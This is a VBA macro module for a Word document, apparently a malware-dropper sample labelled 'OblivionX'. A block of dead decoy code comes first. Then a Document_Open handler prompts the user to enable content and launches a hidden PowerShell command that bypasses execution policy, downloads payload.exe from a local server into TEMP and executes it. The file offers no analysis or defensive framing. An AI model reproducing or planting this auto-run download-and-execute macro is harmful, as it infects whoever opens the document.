
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If MsgBox("Do you want to enable this content?", vbYesNo) <> vbYes Then
        Exit Sub
    End If
    Dim cmd As String
    Dim objShell As Object
    Dim url As String, outPath As String
    url = "http://127.0.0.1:9090/payload.exe"
    outPath = Environ("TEMP") & "\oblivionx_payload.exe"
    cmd = "powershell.exe -NoProfile -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -Command " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run cmd, 0, False
End Sub
